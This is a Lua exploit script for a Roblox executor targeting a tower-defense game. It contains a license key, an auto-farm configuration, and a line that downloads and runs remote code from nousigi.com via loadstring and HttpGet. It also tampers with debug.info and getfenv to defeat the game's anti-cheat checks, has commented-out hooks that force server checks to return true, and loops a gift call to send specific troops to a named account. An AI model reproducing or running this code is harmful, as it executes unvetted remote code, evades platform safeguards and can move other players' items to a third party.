getgenv().Key = "k3d5cc04abcc9f3116173d57"
getgenv().Config = {["AutoVoteDifficulty"]=false,["RequiredGem"]=1000,["SellRarities"]={["Legendary"]=false,["Basic"]=false,["Epic"]=false,["Uncommon"]=false,["Rare"]=false},["DelayReplay"]=5,["WH_MatchComplete"]=false,["AutoSkip"]=false,["AutoClaimQuest"]=true,["TPLobbyIfPlayer"]=false,["WH_MailSent"]=false,["Summon10"]=true,["ALFS_DelayHop"]=30,["PlaceFailsafe"]=true,["AutoJoinEndless"]=false,["PlayMacro"]=false,["AutoMail"]=false,["AutoUseBoost"]=false,["AutoSummonTroop"]=false,["DelayJoin"]=5,["SellWave"]=1,["AutoClaimEventPass"]=true,["AutoReturnToLobby"]=false,["BuyEventName"]="arabiayi4042",["RequireRoll"]=0,["AutoJoinMatch"]=false,["ALFS_HopServer"]=false,["IgnoreMacroTiming"]=false,["AutoClaimDailyReward"]=true,["AutoSellOW"]=false,["BlackScreen"]=true,["BoostFPS"]=true,["DeleteMap"]=true,["AutoClaimVIP"]=true,["AutoReplay"]=false,["AutoListForSale"]=false,["AutoBuyEvent"]=true,["AutoClaimEventQuest"]=true,["AutoRejoin"]=false,["UseAll"]=false,["SummonDelay"]=0.3,["ABE_Gift"]=true,["AutoClaimPlaytimeReward"]=true,["JoinFailsafe"]=false,["UseBoosts"]={["2xCoinsBoost_1"]=false,["2xLuckBoost_1"]=false,["2xEventXPBoost_1"]=false,["2xEventXPBoost_10"]=false,["2xXPBoost_1"]=false,["2xXPBoost_10"]=false,["2xCoinsBoost_10"]=false,["2xLuckBoost_10"]=false},["AutoSave"]=true}
repeat wait()spawn(function()loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()end)wait(10)until Joebiden
wait(30)
if not getupvalue then getupvalue = debug.getupvalue end
local users = {
"Actellect75",

}

local troopsToSend = {
    "KingDrillman"
}


local TTD
local save
local handler
local Network
local Invoke
local Fire
task.spawn(function()
    TTD = require(game:GetService("ReplicatedStorage").MultiboxFramework)
    save = TTD.Replicate:WaitForReplica("PlayerData-" .. game:GetService("Players").LocalPlayer.UserId)

    repeat
        pcall(function()
            Network = TTD.Network
            Invoke = Network.Invoke
            Fire = Network.Fire
        end)
        task.wait(0.1)
    until Network ~= nil and Invoke ~= nil and Fire ~= nil
end)
repeat wait() until Invoke and Network and Fire

local SInd = debug.info(Invoke,"s")
local old =  getrenv().debug.info
setreadonly(getrenv().debug,false)

getrenv().debug.info = function(...) 
    local lv,st = ...
    if lv == 2 and st == "s" then 
        return SInd
    end
    error("hi")
    return nil
end
setreadonly(getrenv().debug,true)

local old = getrenv().getfenv
getrenv().getfenv = function(...) 
    error("hi")
    return nil
end
-- Invoke = Network.Invoke; local GetFunc = getupvalue(Invoke, 1)
-- Fire = Network.Fire; local GetEvent = getupvalue(Fire, 1)

-- coroutine.wrap(function()
--     setidentity(2)
--     hookfunc(getupvalue(GetFunc, 1), function()
--         return true
--     end)
--     setidentity(8)
-- end)()

-- coroutine.wrap(function()
--     setidentity(2)
--     hookfunc(getupvalue(GetEvent, 1), function()
--         return true
--     end)
--     setidentity(8)
-- end)()


local invTroops = {}
function getInventoryTroops()
    invTroops = {}
    local save = TTD.Replicate:WaitForReplica("PlayerData-" .. game:GetService("Players").LocalPlayer.UserId)
   -- for k,v in save._data.InventoryItems.Troops do print(k,v) end
    for name, v in pairs(save._data.InventoryItems.Troops) do
        for i, v in pairs(v) do
            invTroops[i] = name
        end
    end
    return invTroops
end

local coins
function getCoinAmt()
    coins = 0
    local save = TTD.Replicate:WaitForReplica("PlayerData-" .. game:GetService("Players").LocalPlayer.UserId)
    for i, v in pairs(save._data) do
        if i == "Currencies" then
            coins = v.Coins
        end
    end
    return coins
end

function hasTroop(id)
    troops = getInventoryTroops()
    for i, v in troops do
        if i == id then
            return true
        end
    end
    return false
end

startAmt = getCoinAmt()

local amt = 0

for i, user in users do
    local sent = {}
    for i, v in getInventoryTroops() do
        if table.find(troopsToSend, v) and not table.find(sent, v) then
            table.insert(sent, v)
            local oldC = getCoinAmt()
            local st = tick()
            repeat
                Invoke("PostOffice_SendGift", game.Players:GetUserIdFromNameAsync(user), "Troops", i, 0,
                    tostring(math.random(1, 10000)))
                task.wait(0.1)
            until getCoinAmt() < oldC and not hasTroop(i)
            print("sent","time taken:",tick()-st)
        end
    end
    print('finished user:',user)
end

print('Should have sent:', amt)
